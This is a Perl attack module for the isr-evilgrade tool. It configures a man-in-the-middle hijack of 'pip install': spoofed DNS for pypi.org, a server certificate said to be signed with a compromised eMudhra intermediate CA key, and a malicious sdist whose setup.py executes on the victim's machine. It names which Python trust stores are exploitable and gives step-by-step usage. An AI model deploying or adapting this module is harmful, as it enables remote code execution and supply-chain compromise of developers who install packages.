###############
# pypi_update.pm
#
# pip install MITM via the compromised eMudhra CA.
#
# `pip install <pkg>` fetches the PEP503 simple index + the package sdist, then
# BUILDS it -- running the sdist's setup.py at install time (that is the RCE).
# PyPI does not sign sdists (PGP signing was removed in 2023), so integrity of
# the download rests ENTIRELY on TLS. There is no second signature layer to
# forge -- unlike apt/yum (GPG), go modules (GOSUMDB) or nuclei code templates
# (embedded ECDSA). If the victim's TLS trust store accepts our server cert, the
# malicious sdist runs. That is the whole attack.
#
# The server cert (certs/emudhra_mitm/server.pem) is NOT self-forged: it is a
# leaf for github.com/pypi.org signed by the REAL eMudhra intermediate
# "EM DV TLS CA - G3C", which is cross-signed by the public root "AAA
# Certificate Services" (Sectigo/Comodo). The repo holds that intermediate's
# COMPROMISED private key (one of the eMudhra intermediate keys recovered in the
# 2026 disclosure). So the chain validates against any trust store that still
# contains the AAA root and has not applied the eMudhra block -- no client-side
# tampering, no injected CA.
#
# WHO IS VULNERABLE (verified on this host, no flags, no overrides):
#   * VULNERABLE: the system OpenSSL store (/etc/ssl/cert.pem) and any pip whose
#     certifi bundle still ships the AAA root -- this includes the stock macOS
#     /usr/bin/python3, and typical distro/corporate python builds. A BARE
#     `pip install evilpkg` (no --cert, no --index-url) is enough once DNS
#     points pypi.org at evilgrade.
#   * NOT vulnerable: trust stores that removed the AAA root or applied the
#     eMudhra distrust -- e.g. Homebrew's ca-certificates bundle, and Apple
#     SecureTransport (Safari, Apple git/curl) which block the eMudhra
#     intermediates since 2026-10-19.
# So exploitability depends on the vintage/source of the CLIENT bundle, NOT on
# any attacker-supplied flag. (--cert /etc/ssl/cert.pem only matters for a pip
# whose own bundle already removed AAA but whose system store still trusts it.)
#
# Use with: set sslport 443, set sslcert certs/emudhra_mitm, enable + start
# (the DNS server answers pypi.org automatically from this vh). Then the victim
# runs a BARE pip install -- pip's default index is https://pypi.org/simple, so
# no --index-url is needed once DNS points pypi.org at evilgrade:
#   /usr/bin/python3 -m pip install evilpkg
#
# The index uses a RELATIVE href so the sdist is served from the same host as
# the index -- no second (files.pythonhosted.org) origin needed.
#
# This file is part of isr-evilgrade, www.faradaysec.com .
##
package modules::pypi_update;

use strict;
use Data::Dump qw(dump);
use isrcore::utils;

my $base = {
    'name'        => 'pip install MITM (eMudhra CA)',
    'version'     => '1.1',
    'appver'      => 'pip whose trust store still ships the AAA root (stock macOS /usr/bin/python3, many distro/corp pythons)',
    'cve'         => 'eMudhra intermediate key compromise (2026)',
    'author'      => ['Francisco Amato < famato +[AT]+ faradaysec.com>', 'Security Research Team'],
    'description' => qq{
Intercepts pip's PyPI traffic and serves a malicious sdist whose setup.py runs
at install time -> code execution as the user. PyPI does not sign sdists, so
integrity rests ENTIRELY on TLS. The server cert is a real eMudhra intermediate
(cross-signed by the public AAA/Sectigo root) with a compromised key, so a BARE
`pip install evilpkg` is enough against any client whose trust store still ships
the AAA root (stock macOS /usr/bin/python3, many distro/corp pythons). Stores
that removed AAA or applied the eMudhra distrust (Homebrew ca-certificates,
Apple SecureTransport) are not affected. Set 'sslcert' to certs/emudhra_mitm.
},
    'vh' => '(pypi.org|files.pythonhosted.org|pypi.python.org)',
    'request' => [
        {   'req'    => '/simple/evilpkg/?$',
            'type'   => 'file',
            'method' => '', 'bin' => 0, 'string' => '', 'parse' => 0,
            'file'   => './include/pip_mitm/simple/evilpkg/index.html',
            'cheader' => "HTTP/1.1 200 OK\r\nContent-Type: text/html\r\nConnection: close\r\n\r\n",
        },
        {   'req'    => '/.*evilpkg-1\.0\.tar\.gz',
            'type'   => 'file',
            'method' => '', 'bin' => 1, 'string' => '', 'parse' => 0,
            'file'   => './include/pip_mitm/simple/evilpkg/evilpkg-1.0.tar.gz',
            'cheader' => "HTTP/1.1 200 OK\r\nContent-Type: application/octet-stream\r\nConnection: close\r\n\r\n",
        },
    ],
    'options' => {
        'enable' => { 'val' => 0, 'desc' => 'Status' },
        'agent'  => { 'val' => './include/pip_mitm/simple/evilpkg/evilpkg-1.0.tar.gz', 'desc' => 'Required by webserver (the malicious sdist)' },
    }
};

sub new {
    my $class = shift;
    my $self = { 'Base' => $base, @_ };
    return bless $self, $class;
}
1;
